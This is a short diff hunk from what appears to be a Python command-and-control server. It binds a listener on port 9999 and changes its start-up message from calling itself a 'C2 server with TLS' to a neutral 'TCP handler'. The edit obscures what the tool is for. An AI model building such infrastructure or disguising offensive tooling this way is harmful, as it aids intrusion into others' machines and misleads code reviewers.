@@ -128,7 +128,7 @@ if __name__ == '__main__':
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind(("0.0.0.0", 9999))
     server.listen(5)
-    print("[+] C2 server with TLS listening on port 9999")
+    print("[+] Starting TCP handler on port 9999")
     
     threading.Thread(target=accept_connections, args=(server,)).start()
     medusax_prompt()
